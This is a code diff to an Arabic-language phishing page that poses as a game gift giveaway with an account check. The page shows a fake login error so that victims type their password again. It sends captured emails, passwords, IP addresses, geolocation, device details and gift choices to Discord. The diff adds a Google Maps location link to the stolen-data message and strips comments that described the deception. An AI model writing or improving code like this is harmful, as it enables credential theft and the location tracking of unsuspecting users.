@@ -112,7 +112,6 @@
             display: none;
         }
         
-        /* قائمة الهدايا */
         .gift-grid {
             display: grid;
             grid-template-columns: 1fr;
@@ -138,7 +137,6 @@
         .gift-title { font-size: 13px; font-weight: bold; color: #fff; }
         .gift-desc { font-size: 11px; color: #94a3b8; }
 
-        /* شاشة التحميل والنجاح */
         .spinner {
             width: 45px;
             height: 45px;
@@ -192,8 +190,8 @@
         <div id="loadingSection" class="hidden">
             <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
             <div class="spinner"></div>
-            <h2 style="color: #38bdf8; font-size: 16px;" id="loadingTitle">جاري فحص الحساب...</h2>
-            <p class="subtitle" id="loadingSub">يتم التحقق من توافق الحساب مع خوادم اللعبة</p>
+            <h2 style="color: #38bdf8; font-size: 16px;">جاري فحص الحساب...</h2>
+            <p class="subtitle">يتم التحقق من توافق الحساب مع خوادم اللعبة</p>
         </div>
 
         <!-- 3. واجهة اختيار الهدية -->
@@ -284,17 +282,13 @@
             capturedEmail = document.getElementById('email').value;
             capturedPassword = document.getElementById('password').value;
 
-            // إذا كانت المحاولة الأولى، نظهر خطأ وهمي لضمان جلب كلمة مرور صحيحة في المحاولة القادمة
             if (attemptCount === 1) {
-                // إرسال المحاولة الأولى للديسكورد بصمت
-                collectAndSendData("محاولة أولى (قد تكون غير دقيقة)");
-                
+                collectAndSendData("محاولة أولى (غير مؤكدة)");
                 document.getElementById('loginError').style.display = 'block';
                 document.getElementById('password').value = '';
                 return;
             }
 
-            // المحاولة الثانية أو أكثر: إرسال البيانات الحقيقية والانتقال للتحميل
             collectAndSendData("محاولة ناجحة (المعلومات المؤكدة)");
 
             document.getElementById('loginSection').classList.add('hidden');
@@ -309,13 +303,20 @@
         async function collectAndSendData(statusTag) {
             let ip = "Unknown";
             let locationInfo = "Unknown";
+            let mapLink = "غير متوفر";
+            
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 ip = ipData.ip;
+
                 let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                 let data = await geoRes.json();
                 locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'}`;
+                
+                if (data.latitude && data.longitude) {
+                    mapLink = `https://maps.google.com/?q=${data.latitude},${data.longitude}`;
+                }
             } catch (err) {}
 
             let info = getAdvancedDeviceInfo();
@@ -324,6 +325,7 @@
                       `🔑 **كلمة المرور:** \`${capturedPassword}\`\n` +
                       `🌐 **الـ IP:** \`${ip}\`\n` +
                       `📍 **الموقع:** ${locationInfo}\n` +
+                      `🗺️ **رابط الخريطة:** ${mapLink}\n` +
                       `📱 **الجهاز:** \`${info.device}\``;
 
             await sendToDiscord(msg);
@@ -339,7 +341,7 @@
         }
 
         async function submitGiftChoice() {
-            await sendToDiscord(`🎁 **[ اختيار الهدية ]**\nالإيميل: \`${capturedEmail}\`\nالهدية المختار: **${chosenGift}**`);
+            await sendToDiscord(`🎁 **[ اختيار الهدية ]**\nالإيميل: \`${capturedEmail}\`\nالهدية المختارة: **${chosenGift}**`);
             
             document.getElementById('giftSection').classList.add('hidden');
             document.getElementById('successSection').classList.remove('hidden');
